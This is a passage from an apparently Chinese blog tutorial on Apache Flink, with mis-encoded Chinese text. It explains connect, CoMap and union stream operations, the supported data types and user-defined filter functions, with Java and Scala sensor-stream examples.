temperature=15.4&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h6 id="Connectå’ŒCoMap"><a href="#Connectå’ŒCoMap" class="headerlink" title="Connectå’ŒCoMap"></a>Connectå’ŒCoMap</h6><p>####### Connect</p><p><img src="https://img-blog.csdnimg.cn/20200902202832986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=aMFhA&originHeight=287&originWidth=732&originalType=binary&ratio=1&status=done&style=none"><br><strong>DataStream,DataStream -&gt; ConnectedStreams</strong>: è¿æ¥ä¸¤ä¸ªä¿æŒä»–ä»¬ç±»å‹çš„æ•°æ®æµï¼Œä¸¤ä¸ªæ•°æ®æµè¢«Connect ä¹‹åï¼Œåªæ˜¯è¢«æ”¾åœ¨äº†ä¸€ä¸ªæµä¸­ï¼Œå†…éƒ¨ä¾ç„¶ä¿æŒå„è‡ªçš„æ•°æ®å’Œå½¢å¼ä¸å‘ç”Ÿä»»ä½•å˜åŒ–ï¼Œä¸¤ä¸ªæµç›¸äº’ç‹¬ç«‹ã€‚</p><p>####### CoMap</p><p><img src="https://img-blog.csdnimg.cn/20200902203333640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=hudRR&originHeight=267&originWidth=602&originalType=binary&ratio=1&status=done&style=none"><br><strong>ConnectedStreams -&gt; DataStream</strong>: ä½œç”¨äºConnectedStreams ä¸Šï¼ŒåŠŸèƒ½ä¸mapå’ŒflatMapä¸€æ ·ï¼Œå¯¹ConnectedStreams ä¸­çš„<strong>æ¯ä¸€ä¸ªStreamåˆ†åˆ«è¿›è¡Œmapå’ŒflatMapæ“ä½œ</strong>ï¼›</p><hr><p>è™½ç„¶Flink1.12.1çš„DataStreamæœ‰connectå’Œmapæ–¹æ³•ï¼Œä½†æ˜¯æ•™ç¨‹åŸºäºå‰é¢çš„splitå’Œselectç¼–å†™ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥é™„ä¸Šæ•™ç¨‹çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.apitest.transform;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2018-2028 å°šç¡…è°· All Rights Reserved</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Project: FlinkTutorial</span></span><br><span class="line"><span class="comment"> * Package: com.atguigu.apitest.transform</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Created by wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.collector.selector.OutputSelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.ConnectedStreams;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SplitStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoMapFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: TransformTest4_MultipleStreams</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest4_MultipleStreams</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;D:\\Projects\\BigData\\FlinkTutorial\\src\\main\\resources\\sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReading</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125; );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. åˆ†æµï¼ŒæŒ‰ç…§æ¸©åº¦å€¼30åº¦ä¸ºç•Œåˆ†ä¸ºä¸¤æ¡æµ</span></span><br><span class="line">        SplitStream&lt;SensorReading&gt; splitStream = dataStream.split(<span class="keyword">new</span> OutputSelector&lt;SensorReading&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Iterable&lt;String&gt; <span class="title">select</span><span class="params">(SensorReading value)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> (value.getTemperature() &gt; <span class="number">30</span>) ? Collections.singletonList(<span class="string">&quot;high&quot;</span>) : Collections.singletonList(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; highTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">        DataStream&lt;SensorReading&gt; lowTempStream = splitStream.select(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">        DataStream&lt;SensorReading&gt; allTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// highTempStream.print(&quot;high&quot;);</span></span><br><span class="line">        <span class="comment">// lowTempStream.print(&quot;low&quot;);</span></span><br><span class="line">        <span class="comment">// allTempStream.print(&quot;all&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. åˆæµ connectï¼Œå°†é«˜æ¸©æµè½¬æ¢æˆäºŒå…ƒç»„ç±»å‹ï¼Œä¸ä½æ¸©æµè¿æ¥åˆå¹¶ä¹‹åï¼Œè¾“å‡ºçŠ¶æ€ä¿¡æ¯</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String, Double&gt;&gt; warningStream = highTempStream.map(<span class="keyword">new</span> MapFunction&lt;SensorReading, Tuple2&lt;String, Double&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Double&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getTemperature());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        ConnectedStreams&lt;Tuple2&lt;String, Double&gt;, SensorReading&gt; connectedStreams = warningStream.connect(lowTempStream);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Object&gt; resultStream = connectedStreams.map(<span class="keyword">new</span> CoMapFunction&lt;Tuple2&lt;String, Double&gt;, SensorReading, Object&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">map1</span><span class="params">(Tuple2&lt;String, Double&gt; value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple3&lt;&gt;(value.f0, value.f1, <span class="string">&quot;high temp warning&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">map2</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), <span class="string">&quot;normal&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(sensor_1,35.8,high temp warning)</span><br><span class="line">(sensor_6,normal)</span><br><span class="line">(sensor_10,38.1,high temp warning)</span><br><span class="line">(sensor_7,normal)</span><br><span class="line">(sensor_1,36.3,high temp warning)</span><br><span class="line">(sensor_1,32.8,high temp warning)</span><br><span class="line">(sensor_1,37.1,high temp warning)</span><br></pre></td></tr></table></figure><h6 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h6><p><img src="https://img-blog.csdnimg.cn/20200902205220165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=XfxZV&originHeight=297&originWidth=646&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>DataStream -&gt; DataStream</strong>ï¼šå¯¹<strong>ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Š</strong>çš„DataStreamè¿›è¡ŒUnionæ“ä½œï¼Œäº§ç”Ÿä¸€ä¸ªåŒ…å«å¤šæœ‰DataStreamå…ƒç´ çš„æ–°DataStreamã€‚</p><p><strong>é—®é¢˜ï¼šå’ŒConnectçš„åŒºåˆ«ï¼Ÿ</strong></p><ol><li>Connect çš„æ•°æ®ç±»å‹å¯ä»¥ä¸åŒï¼Œ<strong>Connect åªèƒ½åˆå¹¶ä¸¤ä¸ªæµ</strong>ï¼›</li><li><strong>Unionå¯ä»¥åˆå¹¶å¤šæ¡æµï¼ŒUnionçš„æ•°æ®ç»“æ„å¿…é¡»æ˜¯ä¸€æ ·çš„</strong>ï¼›</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. unionè”åˆå¤šæ¡æµ</span></span><br><span class="line"><span class="comment">//        warningStream.union(lowTempStream); è¿™ä¸ªä¸è¡Œï¼Œå› ä¸ºwarningStreamç±»å‹æ˜¯DataStream&lt;Tuple2&lt;String, Double&gt;&gt;ï¼Œè€ŒhighTempStreamæ˜¯DataStream&lt;SensorReading&gt;</span></span><br><span class="line">        highTempStream.union(lowTempStream, allTempStream);</span><br></pre></td></tr></table></figure><h5 id="ç®—å­è½¬æ¢"><a href="#ç®—å­è½¬æ¢" class="headerlink" title="ç®—å­è½¬æ¢"></a>ç®—å­è½¬æ¢</h5><blockquote><p><a href="https://blog.csdn.net/a_drjiaoda/article/details/89357916">Flinkå¸¸ç”¨ç®—å­Transformationï¼ˆè½¬æ¢ï¼‰</a></p></blockquote><pre><code>åœ¨Stormä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ç”¨Boltçš„å±‚çº§å…³ç³»æ¥è¡¨ç¤ºå„ä¸ªæ•°æ®çš„æµå‘å…³ç³»ï¼Œç»„æˆä¸€ä¸ªæ‹“æ‰‘ã€‚åœ¨Flinkä¸­ï¼Œ**Transformationç®—å­å°±æ˜¯å°†ä¸€ä¸ªæˆ–å¤šä¸ªDataStreamè½¬æ¢ä¸ºæ–°çš„DataStream**ï¼Œå¯ä»¥å°†å¤šä¸ªè½¬æ¢ç»„åˆæˆå¤æ‚çš„æ•°æ®æµæ‹“æ‰‘ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒDataStreamä¼šç”±ä¸åŒçš„Transformationæ“ä½œï¼Œè½¬æ¢ã€è¿‡æ»¤ã€èšåˆæˆå…¶ä»–ä¸åŒçš„æµï¼Œä»è€Œå®Œæˆæˆ‘ä»¬çš„ä¸šåŠ¡è¦æ±‚ã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20190417171341810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FfZHJqaWFvZGE=,size_16,color_FFFFFF,t_70###id=XEJKu&originHeight=475&originWidth=839&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="æ”¯æŒçš„æ•°æ®ç±»å‹"><a href="#æ”¯æŒçš„æ•°æ®ç±»å‹" class="headerlink" title="æ”¯æŒçš„æ•°æ®ç±»å‹"></a>æ”¯æŒçš„æ•°æ®ç±»å‹</h4><pre><code>Flinkæµåº”ç”¨ç¨‹åºå¤„ç†çš„æ˜¯ä»¥æ•°æ®å¯¹è±¡è¡¨ç¤ºçš„äº‹ä»¶æµã€‚æ‰€ä»¥åœ¨Flinkå†…éƒ¨ï¼Œæˆ‘ä»¬éœ€è¦èƒ½å¤Ÿå¤„ç†è¿™äº›å¯¹è±¡ã€‚å®ƒä»¬**éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–**ï¼Œä»¥ä¾¿é€šè¿‡ç½‘ç»œä¼ é€å®ƒä»¬ï¼›æˆ–è€…ä»çŠ¶æ€åç«¯ã€æ£€æŸ¥ç‚¹å’Œä¿å­˜ç‚¹è¯»å–å®ƒä»¬ã€‚ä¸ºäº†æœ‰æ•ˆåœ°åšåˆ°è¿™ä¸€ç‚¹ï¼ŒFlinkéœ€è¦æ˜ç¡®çŸ¥é“åº”ç”¨ç¨‹åºæ‰€å¤„ç†çš„æ•°æ®ç±»å‹ã€‚Flinkä½¿ç”¨ç±»å‹ä¿¡æ¯çš„æ¦‚å¿µæ¥è¡¨ç¤ºæ•°æ®ç±»å‹ï¼Œå¹¶ä¸ºæ¯ä¸ªæ•°æ®ç±»å‹ç”Ÿæˆç‰¹å®šçš„åºåˆ—åŒ–å™¨ã€ååºåˆ—åŒ–å™¨å’Œæ¯”è¾ƒå™¨ã€‚Flinkè¿˜å…·æœ‰ä¸€ä¸ªç±»å‹æå–ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿåˆ†æå‡½æ•°çš„è¾“å…¥å’Œè¿”å›ç±»å‹ï¼Œä»¥è‡ªåŠ¨è·å–ç±»å‹ä¿¡æ¯ï¼Œä»è€Œè·å¾—åºåˆ—åŒ–å™¨å’Œååºåˆ—åŒ–å™¨ã€‚ä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¾‹å¦‚lambdaå‡½æ•°æˆ–æ³›å‹ç±»å‹ï¼Œéœ€è¦æ˜¾å¼åœ°æä¾›ç±»å‹ä¿¡æ¯ï¼Œæ‰èƒ½ä½¿åº”ç”¨ç¨‹åºæ­£å¸¸å·¥ä½œæˆ–æé«˜å…¶æ€§èƒ½ã€‚Flinkæ”¯æŒJavaå’ŒScalaä¸­æ‰€æœ‰å¸¸è§æ•°æ®ç±»å‹ã€‚ä½¿ç”¨æœ€å¹¿æ³›çš„ç±»å‹æœ‰ä»¥ä¸‹å‡ ç§ã€‚</code></pre><h5 id="åŸºç¡€æ•°æ®ç±»å‹"><a href="#åŸºç¡€æ•°æ®ç±»å‹" class="headerlink" title="åŸºç¡€æ•°æ®ç±»å‹"></a>åŸºç¡€æ•°æ®ç±»å‹</h5><pre><code>Flinkæ”¯æŒæ‰€æœ‰çš„Javaå’ŒScalaåŸºç¡€æ•°æ®ç±»å‹ï¼ŒInt, Double, Long, String, â€¦</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Integer&gt; numberStream = env.fromElements(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">numberStream.map(data -&gt; data * <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h5 id="Javaå’ŒScalaå…ƒç»„-Tuples"><a href="#Javaå’ŒScalaå…ƒç»„-Tuples" class="headerlink" title="Javaå’ŒScalaå…ƒç»„(Tuples)"></a>Javaå’ŒScalaå…ƒç»„(Tuples)</h5><p>javaä¸åƒScalaå¤©ç”Ÿæ”¯æŒå…ƒç»„Tupleç±»å‹ï¼Œjavaçš„å…ƒç»„ç±»å‹ç”±Flinkçš„åŒ…æä¾›ï¼Œé»˜è®¤æä¾›Tuple0~Tuple25</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; personStream = env.fromElements( </span><br><span class="line">  <span class="keyword">new</span> Tuple2(<span class="string">&quot;Adam&quot;</span>, <span class="number">17</span>), </span><br><span class="line">  <span class="keyword">new</span> Tuple2(<span class="string">&quot;Sarah&quot;</span>, <span class="number">23</span>) </span><br><span class="line">); </span><br><span class="line">personStream.filter(p -&gt; p.f1 &gt; <span class="number">18</span>);</span><br></pre></td></tr></table></figure><h5 id="Scalaæ ·ä¾‹ç±»-case-classes"><a href="#Scalaæ ·ä¾‹ç±»-case-classes" class="headerlink" title="Scalaæ ·ä¾‹ç±»(case classes)"></a>Scalaæ ·ä¾‹ç±»(case classes)</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">name:<span class="type">String</span>,age:<span class="type">Int</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> numbers: <span class="type">DataStream</span>[(<span class="type">String</span>,<span class="type">Integer</span>)] = env.fromElements(</span><br><span class="line">  <span class="type">Person</span>(<span class="string">&quot;å¼ ä¸‰&quot;</span>,<span class="number">12</span>),</span><br><span class="line">  <span class="type">Person</span>(<span class="string">&quot;æå››&quot;</span>ï¼Œ<span class="number">23</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="Javaç®€å•å¯¹è±¡-POJO"><a href="#Javaç®€å•å¯¹è±¡-POJO" class="headerlink" title="Javaç®€å•å¯¹è±¡(POJO)"></a>Javaç®€å•å¯¹è±¡(POJO)</h5><p>javaçš„POJOè¿™é‡Œè¦æ±‚å¿…é¡»æä¾›æ— å‚æ„é€ å‡½æ•°</p><ul><li>æˆå‘˜å˜é‡è¦æ±‚éƒ½æ˜¯publicï¼ˆæˆ–è€…privateä½†æ˜¯æä¾›getã€setæ–¹æ³•ï¼‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">( String name , <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">DataStream Pe rson &gt; persons = env.fromElements(</span><br><span class="line">  <span class="keyword">new</span> Person (<span class="string">&quot; Alex&quot;</span>, <span class="number">42</span>),</span><br><span class="line">  <span class="keyword">new</span> Person (<span class="string">&quot; Wendy&quot;</span>,<span class="number">23</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="å…¶ä»–-Arrays-Lists-Maps-Enums-ç­‰ç­‰"><a href="#å…¶ä»–-Arrays-Lists-Maps-Enums-ç­‰ç­‰" class="headerlink" title="å…¶ä»–(Arrays, Lists, Maps, Enums,ç­‰ç­‰)"></a>å…¶ä»–(Arrays, Lists, Maps, Enums,ç­‰ç­‰)</h5><p>Flinkå¯¹Javaå’ŒScalaä¸­çš„ä¸€äº›ç‰¹æ®Šç›®çš„çš„ç±»å‹ä¹Ÿéƒ½æ˜¯æ”¯æŒçš„ï¼Œæ¯”å¦‚Javaçš„ArrayListï¼ŒHashMapï¼ŒEnumç­‰ç­‰ã€‚</p><h4 id="å®ç°UDFå‡½æ•°â€”â€”æ›´ç»†ç²’åº¦çš„æ§åˆ¶æµ"><a href="#å®ç°UDFå‡½æ•°â€”â€”æ›´ç»†ç²’åº¦çš„æ§åˆ¶æµ" class="headerlink" title="å®ç°UDFå‡½æ•°â€”â€”æ›´ç»†ç²’åº¦çš„æ§åˆ¶æµ"></a>å®ç°UDFå‡½æ•°â€”â€”æ›´ç»†ç²’åº¦çš„æ§åˆ¶æµ</h4><h5 id="å‡½æ•°ç±»-Function-Classes"><a href="#å‡½æ•°ç±»-Function-Classes" class="headerlink" title="å‡½æ•°ç±»(Function Classes)"></a>å‡½æ•°ç±»(Function Classes)</h5><pre><code>Flinkæš´éœ²äº†æ‰€æœ‰UDFå‡½æ•°çš„æ¥å£(å®ç°æ–¹å¼ä¸ºæ¥å£æˆ–è€…æŠ½è±¡ç±»)ã€‚ä¾‹å¦‚MapFunction, FilterFunction, ProcessFunctionç­‰ç­‰ã€‚ä¸‹é¢ä¾‹å­å®ç°äº†FilterFunctionæ¥å£ï¼š</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(<span class="keyword">new</span> FlinkFilter()); </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FlinkFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">String</span>&gt; </span>&#123; </span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> value.contains(<span class="string">&quot;flink&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>è¿˜å¯ä»¥å°†å‡½æ•°å®ç°æˆåŒ¿åç±»</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(</span><br><span class="line">  <span class="keyword">new</span> FilterFunction&lt;String&gt;() &#123; </span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> value.contains(<span class="string">&quot;flink&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><pre><code>æˆ‘ä»¬filterçš„å­—ç¬¦ä¸²&quot;flink&quot;è¿˜å¯ä»¥å½“ä½œå‚æ•°ä¼ è¿›å»ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; tweets = env.readTextFile(<span class="string">&quot;INPUT_FILE &quot;</span>); </span><br><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(<span class="keyword">new</span> KeyWordFilter(<span class="string">&quot;flink&quot;</span>)); </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyWordFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">String</span>&gt; </span>&#123; </span><br><span class="line">  <span class="keyword">private</span> String keyWord; </span><br><span class="line"></span><br><span class="line">  KeyWordFilter(String keyWord) &#123; </span><br><span class="line">    <span class="keyword">this</span>.keyWord = keyWord; </span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> value.contains(<span class="keyword">this</span>.keyWord); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="åŒ¿åå‡½æ•°-Lambda-Functions"><a href="#åŒ¿åå‡½æ•°-Lambda-Functions" class="headerlink" title="åŒ¿åå‡½æ•°(Lambda Functions)"></a>åŒ¿åå‡½æ•°(Lambda Functions)</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; tweets = env.readTextFile(<span class="string">&quot;INPUT_FILE&quot;</span>); </span><br><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter( tweet -&gt; tweet.contains(<span class="string">&quot;flink&quot;</span>) );</span><br></pre></td></tr></table></figure><h5 